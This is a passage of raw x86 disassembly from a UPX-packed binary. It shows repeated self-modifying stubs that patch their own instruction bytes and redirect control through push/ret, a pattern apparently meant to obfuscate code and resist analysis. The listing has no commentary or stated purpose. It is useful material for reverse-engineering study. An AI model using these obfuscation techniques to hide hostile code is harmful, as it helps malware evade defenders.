  40a93b:	b8 2e 93 33 18       	mov    $0x1833932e,%eax
  40a940:	87 04 24             	xchg   %eax,(%esp)
  40a943:	c3                   	ret
  40a944:	8f 05 72 a9 40 00    	pop    0x40a972
  40a94a:	50                   	push   %eax
  40a94b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a951:	8d 80 8e 54 17 40    	lea    0x4017548e(%eax),%eax
  40a957:	87 05 60 a9 40 00    	xchg   %eax,0x40a960
  40a95d:	58                   	pop    %eax
  40a95e:	f3 90                	pause
  40a960:	d3 fa                	sar    %cl,%edx
  40a962:	d2 56 00             	rclb   %cl,0x0(%esi)
  40a965:	50                   	push   %eax
  40a966:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a96a:	66 87 05 60 a9 40 00 	xchg   %ax,0x40a960
  40a971:	b8 db 05 04 7f       	mov    $0x7f0405db,%eax
  40a976:	87 04 24             	xchg   %eax,(%esp)
  40a979:	c3                   	ret
  40a97a:	8f 05 aa a9 40 00    	pop    0x40a9aa
  40a980:	50                   	push   %eax
  40a981:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a987:	8d 80 b2 e4 e3 00    	lea    0xe3e4b2(%eax),%eax
  40a98d:	87 05 96 a9 40 00    	xchg   %eax,0x40a996
  40a993:	58                   	pop    %eax
  40a994:	f3 90                	pause
  40a996:	b1 75                	mov    $0x75,%cl
  40a998:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a999:	8d 00                	lea    (%eax),%eax
  40a99b:	00 00                	add    %al,(%eax)
  40a99d:	50                   	push   %eax
  40a99e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a9a2:	66 87 05 96 a9 40 00 	xchg   %ax,0x40a996
  40a9a9:	b8 d3 b0 ce 42       	mov    $0x42ceb0d3,%eax
  40a9ae:	8d 40 02             	lea    0x2(%eax),%eax
  40a9b1:	87 04 24             	xchg   %eax,(%esp)
  40a9b4:	c3                   	ret
  40a9b5:	8f 05 e4 a9 40 00    	pop    0x40a9e4
  40a9bb:	50                   	push   %eax
  40a9bc:	90                   	nop
  40a9bd:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a9c2:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40a9c8:	87 05 d1 a9 40 00    	xchg   %eax,0x40a9d1
  40a9ce:	58                   	pop    %eax
  40a9cf:	f3 90                	pause
  40a9d1:	7f d0                	jg     0x40a9a3
  40a9d3:	7a 9a                	jp     0x40a96f
  40a9d5:	40                   	inc    %eax
  40a9d6:	00 50 66             	add    %dl,0x66(%eax)
  40a9d9:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a9de:	05 d1 a9 40 00       	add    $0x40a9d1,%eax
  40a9e3:	b8 ec 64 f6 43       	mov    $0x43f664ec,%eax
  40a9e8:	8d 40 01             	lea    0x1(%eax),%eax
  40a9eb:	87 04 24             	xchg   %eax,(%esp)
  40a9ee:	c3                   	ret
  40a9ef:	8f 05 1d aa 40 00    	pop    0x40aa1d
  40a9f5:	50                   	push   %eax
  40a9f6:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a9fc:	8d 80 d3 b0 4c ff    	lea    -0xb34f2d(%eax),%eax
  40aa02:	87 05 0b aa 40 00    	xchg   %eax,0x40aa0b
  40aa08:	58                   	pop    %eax
  40aa09:	f3 90                	pause
  40aa0b:	0e                   	push   %cs
  40aa0c:	54                   	push   %esp
  40aa0d:	d1 9d ff 50 66 b8    	rcrl   $1,-0x4799af01(%ebp)
  40aa13:	eb e8                	jmp    0x40a9fd
  40aa15:	66 87 05 0b aa 40 00 	xchg   %ax,0x40aa0b
  40aa1c:	b8 7e 60 59 be       	mov    $0xbe59607e,%eax
  40aa21:	87 04 24             	xchg   %eax,(%esp)
  40aa24:	c3                   	ret
  40aa25:	8f 05 54 aa 40 00    	pop    0x40aa54
  40aa2b:	50                   	push   %eax
  40aa2c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40aa32:	8d 80 ee e4 33 50    	lea    0x5033e4ee(%eax),%eax
  40aa38:	87 05 41 aa 40 00    	xchg   %eax,0x40aa41
  40aa3e:	58                   	pop    %eax
  40aa3f:	f3 90                	pause
  40aa41:	16                   	push   %ss
  40aa42:	2e af                	cs scas %es:(%edi),%eax
  40aa44:	fa                   	cli
  40aa45:	40                   	inc    %eax
  40aa46:	00 50 66             	add    %dl,0x66(%eax)
  40aa49:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40aa4e:	05 41 aa 40 00       	add    $0x40aa41,%eax
  40aa53:	b8 72 b1 23 6f       	mov    $0x6f23b172,%eax
  40aa58:	8d 40 01             	lea    0x1(%eax),%eax
  40aa5b:	87 04 24             	xchg   %eax,(%esp)
  40aa5e:	c3                   	ret
  40aa5f:	8f 05 8d aa 40 00    	pop    0x40aa8d
  40aa65:	50                   	push   %eax
  40aa66:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40aa6c:	8d 80 d3 a0 4c ff    	lea    -0xb35f2d(%eax),%eax
  40aa72:	87 05 7b aa 40 00    	xchg   %eax,0x40aa7b
  40aa78:	58                   	pop    %eax
  40aa79:	f3 90                	pause
  40aa7b:	21 b4 d6 4f ff 50 66 	and    %esi,0x6650ff4f(%esi,%edx,8)
  40aa82:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40aa87:	05 7b aa 40 00       	add    $0x40aa7b,%eax
  40aa8c:	b8 50 cf 4a 65       	mov    $0x654acf50,%eax
  40aa91:	87 04 24             	xchg   %eax,(%esp)
  40aa94:	c3                   	ret
  40aa95:	8f 05 c3 aa 40 00    	pop    0x40aac3
  40aa9b:	50                   	push   %eax
  40aa9c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40aaa2:	8d 80 53 f9 bf ff    	lea    -0x4006ad(%eax),%eax
  40aaa8:	87 05 b1 aa 40 00    	xchg   %eax,0x40aab1
  40aaae:	58                   	pop    %eax
  40aaaf:	f3 90                	pause
  40aab1:	40                   	inc    %eax
  40aab2:	76 2f                	jbe    0x40aae3
  40aab4:	68 00 50 66 b8       	push   $0xb8665000
  40aab9:	eb e8                	jmp    0x40aaa3
  40aabb:	66 87 05 b1 aa 40 00 	xchg   %ax,0x40aab1
  40aac2:	b8 31 a7 59 73       	mov    $0x7359a731,%eax
  40aac7:	87 04 24             	xchg   %eax,(%esp)
  40aaca:	c3                   	ret
  40aacb:	8f 05 f9 aa 40 00    	pop    0x40aaf9
  40aad1:	50                   	push   %eax
  40aad2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40aad8:	8d 80 d3 e6 35 ff    	lea    -0xca192d(%eax),%eax
  40aade:	87 05 e7 aa 40 00    	xchg   %eax,0x40aae7
  40aae4:	58                   	pop    %eax
  40aae5:	f3 90                	pause
  40aae7:	d2 f4                	shl    %cl,%ah
  40aae9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40aaea:	bc ff 50 66 b8       	mov    $0xb86650ff,%esp
  40aaef:	eb e8                	jmp    0x40aad9
  40aaf1:	66 87 05 e7 aa 40 00 	xchg   %ax,0x40aae7
  40aaf8:	b8 42 11 bd da       	mov    $0xdabd1142,%eax
  40aafd:	87 04 24             	xchg   %eax,(%esp)
  40ab00:	c3                   	ret
  40ab01:	8f 05 31 ab 40 00    	pop    0x40ab31
  40ab07:	50                   	push   %eax
  40ab08:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ab0e:	8d 80 6e 1d 20 57    	lea    0x57201d6e(%eax),%eax
  40ab14:	87 05 1d ab 40 00    	xchg   %eax,0x40ab1d
  40ab1a:	58                   	pop    %eax
  40ab1b:	f3 90                	pause
  40ab1d:	07                   	pop    %es
  40ab1e:	10 bb 58 40 00 00    	adc    %bh,0x4058(%ebx)
  40ab24:	50                   	push   %eax
  40ab25:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ab29:	66 87 05 1d ab 40 00 	xchg   %ax,0x40ab1d
  40ab30:	b8 2f 4d 9e 9a       	mov    $0x9a9e4d2f,%eax
  40ab35:	8d 40 02             	lea    0x2(%eax),%eax
  40ab38:	87 04 24             	xchg   %eax,(%esp)
  40ab3b:	c3                   	ret
  40ab3c:	8f 05 6a ab 40 00    	pop    0x40ab6a
  40ab42:	50                   	push   %eax
  40ab43:	90                   	nop
  40ab44:	b8 15 20 40 00       	mov    $0x402015,%eax
  40ab49:	8d 80 a3 b0 16 40    	lea    0x4016b0a3(%eax),%eax
  40ab4f:	87 05 58 ab 40 00    	xchg   %eax,0x40ab58
  40ab55:	58                   	pop    %eax
  40ab56:	f3 90                	pause
  40ab58:	4d                   	dec    %ebp
  40ab59:	ee                   	out    %al,(%dx)
  40ab5a:	8f                   	(bad)
  40ab5b:	0b 00                	or     (%eax),%eax
  40ab5d:	50                   	push   %eax
  40ab5e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ab62:	66 87 05 58 ab 40 00 	xchg   %ax,0x40ab58
  40ab69:	b8 26 02 33 45       	mov    $0x45330226,%eax
  40ab6e:	87 04 24             	xchg   %eax,(%esp)
  40ab71:	c3                   	ret
  40ab72:	8f 05 a0 ab 40 00    	pop    0x40aba0
  40ab78:	50                   	push   %eax
  40ab79:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ab7f:	8d 80 d3 d3 34 ff    	lea    -0xcb2c2d(%eax),%eax
  40ab85:	87 05 8e ab 40 00    	xchg   %eax,0x40ab8e
  40ab8b:	58                   	pop    %eax
  40ab8c:	f3 90                	pause
  40ab8e:	52                   	push   %edx
  40ab8f:	c9                   	leave
  40ab90:	c4 a3 ff 50 66 b8    	les    -0x4799af01(%ebx),%esp
  40ab96:	eb e8                	jmp    0x40ab80
  40ab98:	66 87 05 8e ab 40 00 	xchg   %ax,0x40ab8e
  40ab9f:	b8 ac f9 37 ff       	mov    $0xff37f9ac,%eax
  40aba4:	87 04 24             	xchg   %eax,(%esp)
  40aba7:	c3                   	ret
  40aba8:	8f 05 d6 ab 40 00    	pop    0x40abd6
  40abae:	50                   	push   %eax
  40abaf:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40abb5:	8d 80 d3 e6 34 ff    	lea    -0xcb192d(%eax),%eax
  40abbb:	87 05 c4 ab 40 00    	xchg   %eax,0x40abc4
  40abc1:	58                   	pop    %eax
  40abc2:	f3 90                	pause
  40abc4:	5c                   	pop    %esp
  40abc5:	bd e2 c9 ff 50       	mov    $0x50ffc9e2,%ebp
  40abca:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40abce:	66 87 05 c4 ab 40 00 	xchg   %ax,0x40abc4
  40abd5:	b8 25 7b 15 a2       	mov    $0xa2157b25,%eax
  40abda:	87 04 24             	xchg   %eax,(%esp)
  40abdd:	c3                   	ret
  40abde:	8f 05 11 ac 40 00    	pop    0x40ac11
  40abe4:	50                   	push   %eax
  40abe5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40abeb:	8d 80 b2 e5 1f 57    	lea    0x571fe5b2(%eax),%eax
  40abf1:	87 05 fa ab 40 00    	xchg   %eax,0x40abfa
  40abf7:	58                   	pop    %eax
  40abf8:	f3 90                	pause
  40abfa:	e8 05 8c 4e 40       	call   0x408f3804
  40abff:	00 01                	add    %al,(%ecx)
  40ac01:	00 00                	add    %al,(%eax)
  40ac03:	00 50 66             	add    %dl,0x66(%eax)
  40ac06:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40ac0b:	05 fa ab 40 00       	add    $0x40abfa,%eax
  40ac10:	b8 39 94 1d a2       	mov    $0xa21d9439,%eax
  40ac15:	8d 40 05             	lea    0x5(%eax),%eax
  40ac18:	87 04 24             	xchg   %eax,(%esp)
  40ac1b:	c3                   	ret
  40ac1c:	8f 05 4b ac 40 00    	pop    0x40ac4b
  40ac22:	50                   	push   %eax
  40ac23:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ac29:	8d 80 ea f5 fb 51    	lea    0x51fbf5ea(%eax),%eax
  40ac2f:	87 05 38 ac 40 00    	xchg   %eax,0x40ac38
  40ac35:	58                   	pop    %eax
  40ac36:	f3 90                	pause
  40ac38:	37                   	aaa
  40ac39:	5c                   	pop    %esp
  40ac3a:	71 d2                	jno    0x40ac0e
  40ac3c:	40                   	inc    %eax
  40ac3d:	00 50 66             	add    %dl,0x66(%eax)
  40ac40:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40ac45:	05 38 ac 40 00       	add    $0x40ac38,%eax
  40ac4a:	b8 35 00 6a fe       	mov    $0xfe6a0035,%eax
  40ac4f:	8d 40 01             	lea    0x1(%eax),%eax
  40ac52:	87 04 24             	xchg   %eax,(%esp)
  40ac55:	c3                   	ret
  40ac56:	8f 05 85 ac 40 00    	pop    0x40ac85
  40ac5c:	50                   	push   %eax
  40ac5d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ac63:	8d 80 ea f5 ff 51    	lea    0x51fff5ea(%eax),%eax
  40ac69:	87 05 72 ac 40 00    	xchg   %eax,0x40ac72
  40ac6f:	58                   	pop    %eax
  40ac70:	f3 90                	pause
  40ac72:	97                   	xchg   %eax,%edi
  40ac73:	4e                   	dec    %esi
  40ac74:	15 69 40 00 50       	adc    $0x50004069,%eax
  40ac79:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ac7d:	66 87 05 72 ac 40 00 	xchg   %ax,0x40ac72
  40ac84:	b8 f9 b8 e5 94       	mov    $0x94e5b8f9,%eax
  40ac89:	8d 40 01             	lea    0x1(%eax),%eax
  40ac8c:	87 04 24             	xchg   %eax,(%esp)
  40ac8f:	c3                   	ret
  40ac90:	8f 05 be ac 40 00    	pop    0x40acbe
  40ac96:	50                   	push   %eax
  40ac97:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ac9d:	8d 80 d3 5d 34 ff    	lea    -0xcba22d(%eax),%eax
  40aca3:	87 05 ac ac 40 00    	xchg   %eax,0x40acac
  40aca9:	58                   	pop    %eax
  40acaa:	f3 90                	pause
  40acac:	9f                   	lahf
  40acad:	70 ed                	jo     0x40ac9c
  40acaf:	59                   	pop    %ecx
  40acb0:	ff 50 66             	call   *0x66(%eax)
  40acb3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40acb8:	05 ac ac 40 00       	add    $0x40acac,%eax
  40acbd:	b8 af 05 a7 81       	mov    $0x81a705af,%eax
  40acc2:	87 04 24             	xchg   %eax,(%esp)
  40acc5:	c3                   	ret
  40acc6:	8f 05 f6 ac 40 00    	pop    0x40acf6
  40accc:	50                   	push   %eax
  40accd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40acd3:	8d 80 6e 1d 20 57    	lea    0x57201d6e(%eax),%eax
  40acd9:	87 05 e2 ac 40 00    	xchg   %eax,0x40ace2
  40acdf:	58                   	pop    %eax
  40ace0:	f3 90                	pause
  40ace2:	73 36                	jae    0x40ad1a
  40ace4:	77 48                	ja     0x40ad2e
  40ace6:	40                   	inc    %eax
  40ace7:	00 00                	add    %al,(%eax)
  40ace9:	50                   	push   %eax
  40acea:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40acee:	66 87 05 e2 ac 40 00 	xchg   %ax,0x40ace2
  40acf5:	b8 30 78 02 70       	mov    $0x70027830,%eax
  40acfa:	8d 40 02             	lea    0x2(%eax),%eax
  40acfd:	87 04 24             	xchg   %eax,(%esp)
  40ad00:	c3                   	ret
  40ad01:	8f 05 2f ad 40 00    	pop    0x40ad2f
  40ad07:	50                   	push   %eax
  40ad08:	90                   	nop
  40ad09:	b8 15 20 40 00       	mov    $0x402015,%eax
  40ad0e:	8d 80 a4 b8 16 40    	lea    0x4016b8a4(%eax),%eax
  40ad14:	87 05 1d ad 40 00    	xchg   %eax,0x40ad1d
  40ad1a:	58                   	pop    %eax
  40ad1b:	f3 90                	pause
  40ad1d:	d8 87 55 51 00 50    	fadds  0x50005155(%edi)
  40ad23:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ad27:	66 87 05 1d ad 40 00 	xchg   %ax,0x40ad1d
  40ad2e:	b8 bb c6 9f 17       	mov    $0x179fc6bb,%eax
  40ad33:	87 04 24             	xchg   %eax,(%esp)
  40ad36:	c3                   	ret
  40ad37:	8f 05 66 ad 40 00    	pop    0x40ad66
  40ad3d:	50                   	push   %eax
  40ad3e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ad44:	8d 80 54 b2 bb b4    	lea    -0x4b444dac(%eax),%eax
  40ad4a:	87 05 53 ad 40 00    	xchg   %eax,0x40ad53
  40ad50:	58                   	pop    %eax
  40ad51:	f3 90                	pause
  40ad53:	61                   	popa
  40ad54:	ba d9 ec a9 53       	mov    $0x53a9ecd9,%edx
  40ad59:	50                   	push   %eax
  40ad5a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ad5e:	66 87 05 53 ad 40 00 	xchg   %ax,0x40ad53
  40ad65:	b8 5b b0 04 fe       	mov    $0xfe04b05b,%eax
  40ad6a:	8d 40 01             	lea    0x1(%eax),%eax
  40ad6d:	87 04 24             	xchg   %eax,(%esp)
  40ad70:	c3                   	ret
  40ad71:	8f 05 a0 ad 40 00    	pop    0x40ada0
  40ad77:	50                   	push   %eax
  40ad78:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ad7e:	8d 80 54 a0 bb b4    	lea    -0x4b445fac(%eax),%eax
  40ad84:	87 05 8d ad 40 00    	xchg   %eax,0x40ad8d
  40ad8a:	58                   	pop    %eax
  40ad8b:	f3 90                	pause
  40ad8d:	90                   	nop
  40ad8e:	c7                   	(bad)
  40ad8f:	4f                   	dec    %edi
  40ad90:	60                   	pusha
  40ad91:	a9 53 50 66 b8       	test   $0xb8665053,%eax
  40ad96:	eb e8                	jmp    0x40ad80
  40ad98:	66 87 05 8d ad 40 00 	xchg   %ax,0x40ad8d
  40ad9f:	b8 81 c9 8b a9       	mov    $0xa98bc981,%eax
  40ada4:	8d 40 01             	lea    0x1(%eax),%eax
  40ada7:	87 04 24             	xchg   %eax,(%esp)
  40adaa:	c3                   	ret
  40adab:	8f 05 da ad 40 00    	pop    0x40adda
  40adb1:	50                   	push   %eax
  40adb2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40adb8:	8d 80 6c d9 dc 56    	lea    0x56dcd96c(%eax),%eax
  40adbe:	87 05 c7 ad 40 00    	xchg   %eax,0x40adc7
  40adc4:	58                   	pop    %eax
  40adc5:	f3 90                	pause
  40adc7:	ae                   	scas   %es:(%edi),%al
  40adc8:	4b                   	dec    %ebx
  40adc9:	db 64 40 00          	(bad) 0x0(%eax,%eax,2)
  40adcd:	50                   	push   %eax
  40adce:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40add2:	66 87 05 c7 ad 40 00 	xchg   %ax,0x40adc7
  40add9:	b8 3a 56 6c 5a       	mov    $0x5a6c563a,%eax
  40adde:	8d 40 01             	lea    0x1(%eax),%eax
  40ade1:	87 04 24             	xchg   %eax,(%esp)
  40ade4:	c3                   	ret
  40ade5:	8f 05 15 ae 40 00    	pop    0x40ae15
  40adeb:	50                   	push   %eax
  40adec:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40adf2:	8d 80 6e 05 90 56    	lea    0x5690056e(%eax),%eax
  40adf8:	87 05 01 ae 40 00    	xchg   %eax,0x40ae01
  40adfe:	58                   	pop    %eax
  40adff:	f3 90                	pause
  40ae01:	99                   	cltd
  40ae02:	76 76                	jbe    0x40ae7a
  40ae04:	9c                   	pushf
  40ae05:	40                   	inc    %eax
  40ae06:	00 00                	add    %al,(%eax)
  40ae08:	50                   	push   %eax
  40ae09:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ae0d:	66 87 05 01 ae 40 00 	xchg   %ax,0x40ae01
  40ae14:	b8 24 d0 2e e0       	mov    $0xe02ed024,%eax
  40ae19:	8d 40 02             	lea    0x2(%eax),%eax
  40ae1c:	87 04 24             	xchg   %eax,(%esp)
  40ae1f:	c3                   	ret
  40ae20:	8f 05 53 ae 40 00    	pop    0x40ae53
  40ae26:	50                   	push   %eax
  40ae27:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ae2d:	8d 80 b2 e5 93 56    	lea    0x5693e5b2(%eax),%eax
  40ae33:	87 05 3c ae 40 00    	xchg   %eax,0x40ae3c
  40ae39:	58                   	pop    %eax
  40ae3a:	f3 90                	pause
  40ae3c:	39 52 4d             	cmp    %edx,0x4d(%edx)
  40ae3f:	f6 40 00 0a          	testb  $0xa,0x0(%eax)
  40ae43:	00 00                	add    %al,(%eax)
  40ae45:	00 50 66             	add    %dl,0x66(%eax)
  40ae48:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40ae4d:	05 3c ae 40 00       	add    $0x40ae3c,%eax
  40ae52:	b8 0b f5 d9 b6       	mov    $0xb6d9f50b,%eax
  40ae57:	8d 40 05             	lea    0x5(%eax),%eax
  40ae5a:	87 04 24             	xchg   %eax,(%esp)
  40ae5d:	c3                   	ret
  40ae5e:	8f 05 8c ae 40 00    	pop    0x40ae8c
  40ae64:	50                   	push   %eax
  40ae65:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ae6b:	8d 80 a3 b0 16 40    	lea    0x4016b0a3(%eax),%eax
  40ae71:	87 05 7a ae 40 00    	xchg   %eax,0x40ae7a
  40ae77:	58                   	pop    %eax
  40ae78:	f3 90                	pause
  40ae7a:	64 a9 ef 89 00 50    	fs test $0x500089ef,%eax
  40ae80:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ae84:	66 87 05 7a ae 40 00 	xchg   %ax,0x40ae7a
  40ae8b:	b8 04 36 c0 71       	mov    $0x71c03604,%eax
  40ae90:	87 04 24             	xchg   %eax,(%esp)
  40ae93:	c3                   	ret
  40ae94:	8f 05 c2 ae 40 00    	pop    0x40aec2
  40ae9a:	50                   	push   %eax
  40ae9b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40aea1:	8d 80 d3 b1 31 ff    	lea    -0xce4e2d(%eax),%eax
  40aea7:	87 05 b0 ae 40 00    	xchg   %eax,0x40aeb0
  40aead:	58                   	pop    %eax
  40aeae:	f3 90                	pause
  40aeb0:	47                   	inc    %edi
  40aeb1:	9b                   	fwait
  40aeb2:	c6 83 ff 50 66 b8 eb 	movb   $0xeb,-0x4799af01(%ebx)
  40aeb9:	e8 66 87 05 b0       	call   0xb0463624
  40aebe:	ae                   	scas   %es:(%edi),%al
  40aebf:	40                   	inc    %eax
  40aec0:	00 b8 66 02 06 22    	add    %bh,0x22060266(%eax)
  40aec6:	87 04 24             	xchg   %eax,(%esp)
  40aec9:	c3                   	ret
  40aeca:	8f 05 f8 ae 40 00    	pop    0x40aef8
  40aed0:	50                   	push   %eax
  40aed1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40aed7:	8d 80 d3 c4 31 ff    	lea    -0xce3b2d(%eax),%eax
  40aedd:	87 05 e6 ae 40 00    	xchg   %eax,0x40aee6
  40aee3:	58                   	pop    %eax
  40aee4:	f3 90                	pause
  40aee6:	cc                   	int3
  40aee7:	8e 1a                	mov    (%edx),%ds
  40aee9:	ed                   	in     (%dx),%eax
  40aeea:	ff 50 66             	call   *0x66(%eax)
  40aeed:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40aef2:	05 e6 ae 40 00       	add    $0x40aee6,%eax
  40aef7:	b8 4a ee 2e d7       	mov    $0xd72eee4a,%eax
  40aefc:	87 04 24             	xchg   %eax,(%esp)
  40aeff:	c3                   	ret
  40af00:	8f 05 2f af 40 00    	pop    0x40af2f
  40af06:	50                   	push   %eax
  40af07:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40af0d:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40af13:	87 05 1c af 40 00    	xchg   %eax,0x40af1c
  40af19:	58                   	pop    %eax
  40af1a:	f3 90                	pause
  40af1c:	ae                   	scas   %es:(%edi),%al
  40af1d:	25 7f a5 40 00       	and    $0x40a57f,%eax
  40af22:	50                   	push   %eax
  40af23:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40af27:	66 87 05 1c af 40 00 	xchg   %ax,0x40af1c
  40af2e:	b8 8f b1 08 3b       	mov    $0x3b08b18f,%eax
  40af33:	8d 40 01             	lea    0x1(%eax),%eax
  40af36:	87 04 24             	xchg   %eax,(%esp)
  40af39:	c3                   	ret
  40af3a:	8f 05 68 af 40 00    	pop    0x40af68
  40af40:	50                   	push   %eax
  40af41:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40af47:	8d 80 d3 65 47 ff    	lea    -0xb89a2d(%eax),%eax
  40af4d:	87 05 56 af 40 00    	xchg   %eax,0x40af56
  40af53:	58                   	pop    %eax
  40af54:	f3 90                	pause
  40af56:	a3 3d 42 66 ff       	mov    %eax,0xff66423d
  40af5b:	50                   	push   %eax
  40af5c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40af60:	66 87 05 56 af 40 00 	xchg   %ax,0x40af56
  40af67:	b8 28 73 0f 6f       	mov    $0x6f0f7328,%eax
  40af6c:	87 04 24             	xchg   %eax,(%esp)
  40af6f:	c3                   	ret
  40af70:	8f 05 9e af 40 00    	pop    0x40af9e
  40af76:	50                   	push   %eax
  40af77:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40af7d:	8d 80 8c 54 17 40    	lea    0x4017548c(%eax),%eax
  40af83:	87 05 8c af 40 00    	xchg   %eax,0x40af8c
  40af89:	58                   	pop    %eax
  40af8a:	f3 90                	pause
  40af8c:	3c fe                	cmp    $0xfe,%al
  40af8e:	da 8b 00 50 66 b8    	fimull -0x4799b000(%ebx)
  40af94:	eb e8                	jmp    0x40af7e
  40af96:	66 87 05 8c af 40 00 	xchg   %ax,0x40af8c
  40af9d:	b8 24 5f 26 1f       	mov    $0x1f265f24,%eax
  40afa2:	87 04 24             	xchg   %eax,(%esp)
  40afa5:	c3                   	ret
  40afa6:	8f 05 d4 af 40 00    	pop    0x40afd4
  40afac:	50                   	push   %eax
  40afad:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40afb3:	8d 80 d3 49 30 ff    	lea    -0xcfb62d(%eax),%eax
  40afb9:	87 05 c2 af 40 00    	xchg   %eax,0x40afc2
  40afbf:	58                   	pop    %eax
  40afc0:	f3 90                	pause
  40afc2:	d8 4a 16             	fmuls  0x16(%edx)
  40afc5:	fa                   	cli
  40afc6:	ff 50 66             	call   *0x66(%eax)
  40afc9:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40afce:	05 c2 af 40 00       	add    $0x40afc2,%eax
  40afd3:	b8 9b 32 8a d9       	mov    $0xd98a329b,%eax
  40afd8:	87 04 24             	xchg   %eax,(%esp)
  40afdb:	c3                   	ret
  40afdc:	8f 05 0a b0 40 00    	pop    0x40b00a
  40afe2:	50                   	push   %eax
  40afe3:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40afe9:	8d 80 d3 53 48 ff    	lea    -0xb7ac2d(%eax),%eax
  40afef:	87 05 f8 af 40 00    	xchg   %eax,0x40aff8
  40aff5:	58                   	pop    %eax
  40aff6:	f3 90                	pause
  40aff8:	d1 14 69             	rcll   $1,(%ecx,%ebp,2)
  40affb:	7f ff                	jg     0x40affc
  40affd:	50                   	push   %eax
  40affe:	66                   	data16
  40afff:	b8                   	.byte 0xb8

Disassembly of section UPX1:

0040b000 <UPX1>:
  40b000:	eb e8                	jmp    0x40afea
  40b002:	66 87 05 f8 af 40 00 	xchg   %ax,0x40aff8
  40b009:	b8 0b 8c 53 90       	mov    $0x90538c0b,%eax
  40b00e:	87 04 24             	xchg   %eax,(%esp)
  40b011:	c3                   	ret
  40b012:	8f 05 40 b0 40 00    	pop    0x40b040
  40b018:	50                   	push   %eax
  40b019:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b01f:	8d 80 d3 dd 45 ff    	lea    -0xba222d(%eax),%eax
  40b025:	87 05 2e b0 40 00    	xchg   %eax,0x40b02e
  40b02b:	58                   	pop    %eax
  40b02c:	f3 90                	pause
  40b02e:	8b de                	mov    %esi,%ebx
  40b030:	91                   	xchg   %eax,%ecx
  40b031:	22 ff                	and    %bh,%bh
  40b033:	50                   	push   %eax
  40b034:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b038:	66 87 05 2e b0 40 00 	xchg   %ax,0x40b02e
  40b03f:	b8 7d 0d b7 58       	mov    $0x58b70d7d,%eax
  40b044:	87 04 24             	xchg   %eax,(%esp)
  40b047:	c3                   	ret
  40b048:	8f 05 76 b0 40 00    	pop    0x40b076
  40b04e:	50                   	push   %eax
  40b04f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b055:	8d 80 a5 f9 0f 40    	lea    0x400ff9a5(%eax),%eax
  40b05b:	87 05 64 b0 40 00    	xchg   %eax,0x40b064
  40b061:	58                   	pop    %eax
  40b062:	f3 90                	pause
  40b064:	b0 1e                	mov    $0x1e,%al
  40b066:	90                   	nop
  40b067:	76 00                	jbe    0x40b069
  40b069:	50                   	push   %eax
  40b06a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b06e:	66 87 05 64 b0 40 00 	xchg   %ax,0x40b064
  40b075:	b8 71 65 e3 c8       	mov    $0xc8e36571,%eax
  40b07a:	87 04 24             	xchg   %eax,(%esp)
  40b07d:	c3                   	ret
  40b07e:	8f 05 ac b0 40 00    	pop    0x40b0ac
  40b084:	50                   	push   %eax
  40b085:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b08b:	8d 80 d3 21 46 ff    	lea    -0xb9de2d(%eax),%eax
  40b091:	87 05 9a b0 40 00    	xchg   %eax,0x40b09a
  40b097:	58                   	pop    %eax
  40b098:	f3 90                	pause
  40b09a:	8b 21                	mov    (%ecx),%esp
  40b09c:	4f                   	dec    %edi
  40b09d:	60                   	pusha
